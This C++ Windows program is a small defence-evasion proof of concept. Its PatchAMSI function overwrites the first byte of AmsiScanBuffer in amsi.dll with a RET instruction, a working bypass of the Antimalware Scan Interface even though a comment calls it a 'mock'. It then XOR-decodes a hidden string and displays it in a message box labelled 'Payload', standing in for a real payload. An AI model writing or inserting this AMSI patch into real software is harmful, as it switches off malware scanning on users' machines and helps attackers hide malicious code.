#include <windows.h>
#include <vector>
#include <string>

//── XOR decryption helper ──────────────────────────────────────────
std::string xor_decrypt(const std::vector<uint8_t>& enc, uint8_t key = 0xAA) {
    std::string out;
    out.reserve(enc.size());
    for (auto b : enc) out += char(b ^ key);
    return out;
}

//── Mock AMSI bypass: patch AmsiScanBuffer to just 'ret' ────────────
void PatchAMSI() {
    HMODULE h = LoadLibraryA("amsi.dll");
    if (!h) return;

    FARPROC fn = GetProcAddress(h, "AmsiScanBuffer");
    if (!fn) return;

    DWORD old;
    if (VirtualProtect((LPVOID)fn, 1, PAGE_EXECUTE_READWRITE, &old)) {
        *(BYTE*)fn = 0xC3;  // RET instruction
        VirtualProtect((LPVOID)fn, 1, old, &old);
    }
}


//── Entry Point ────────────────────────────────────────────────────
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    PatchAMSI();

    // XOR‑encoded "Hello from stealthy EXE!"
    std::vector<uint8_t> enc = {
        226, 207, 198, 198, 197, 138, 204, 216, 197, 199, 138, 217, 222, 207, 203, 198, 222, 194, 211, 138, 239, 242, 239, 139
    };
    std::string msg = xor_decrypt(enc);

    MessageBoxA(nullptr, msg.c_str(), "Payload", MB_OK);
    return 0;
}
